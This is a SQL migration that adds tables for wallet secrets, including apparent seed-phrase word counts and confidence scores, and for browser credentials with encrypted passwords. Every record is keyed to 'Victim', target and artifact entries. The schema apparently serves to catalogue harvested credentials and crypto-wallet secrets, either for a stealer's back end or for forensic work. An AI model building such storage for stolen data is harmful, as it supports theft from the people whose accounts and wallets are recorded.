-- Additive vault model: secrets and credentials stay linked to victim/target/artifact.
ALTER TYPE "WalletState" ADD VALUE IF NOT EXISTS 'no_vault';
ALTER TYPE "WalletState" ADD VALUE IF NOT EXISTS 'failed';

ALTER TABLE "Wallet"
  ADD COLUMN "label" TEXT,
  ADD COLUMN "source" TEXT,
  ADD COLUMN "decryptError" TEXT,
  ADD COLUMN "lastSeenAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  ADD COLUMN "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP;

CREATE INDEX "Wallet_victimId_targetId_idx" ON "Wallet"("victimId", "targetId");
CREATE INDEX "Wallet_lastSeenAt_idx" ON "Wallet"("lastSeenAt");

CREATE TABLE "WalletSecret" (
  "id" UUID NOT NULL,
  "walletId" UUID NOT NULL,
  "kind" TEXT NOT NULL,
  "valueEnc" TEXT NOT NULL,
  "valueHash" TEXT NOT NULL,
  "words" INTEGER,
  "confidence" DOUBLE PRECISION,
  "source" TEXT,
  "artifactId" UUID,
  "firstSeenAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "WalletSecret_pkey" PRIMARY KEY ("id")
);

CREATE UNIQUE INDEX "WalletSecret_walletId_kind_valueHash_key"
  ON "WalletSecret"("walletId", "kind", "valueHash");
CREATE INDEX "WalletSecret_walletId_kind_idx" ON "WalletSecret"("walletId", "kind");
CREATE INDEX "WalletSecret_valueHash_idx" ON "WalletSecret"("valueHash");

CREATE TABLE "Credential" (
  "id" UUID NOT NULL,
  "victimId" UUID NOT NULL,
  "targetId" TEXT NOT NULL,
  "kind" TEXT NOT NULL DEFAULT 'browser',
  "path" TEXT NOT NULL,
  "url" TEXT,
  "username" TEXT NOT NULL DEFAULT '',
  "passwordEnc" TEXT,
  "state" TEXT NOT NULL DEFAULT 'found',
  "reason" TEXT,
  "artifactId" UUID,
  "firstSeenAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "Credential_pkey" PRIMARY KEY ("id")
);

CREATE UNIQUE INDEX "Credential_victimId_targetId_path_username_key"
  ON "Credential"("victimId", "targetId", "path", "username");
CREATE INDEX "Credential_victimId_updatedAt_idx" ON "Credential"("victimId", "updatedAt");
CREATE INDEX "Credential_targetId_idx" ON "Credential"("targetId");

ALTER TABLE "WalletSecret" ADD CONSTRAINT "WalletSecret_walletId_fkey"
  FOREIGN KEY ("walletId") REFERENCES "Wallet"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "WalletSecret" ADD CONSTRAINT "WalletSecret_artifactId_fkey"
  FOREIGN KEY ("artifactId") REFERENCES "Artifact"("id") ON DELETE SET NULL ON UPDATE CASCADE;
ALTER TABLE "Credential" ADD CONSTRAINT "Credential_victimId_fkey"
  FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Credential" ADD CONSTRAINT "Credential_artifactId_fkey"
  FOREIGN KEY ("artifactId") REFERENCES "Artifact"("id") ON DELETE SET NULL ON UPDATE CASCADE;
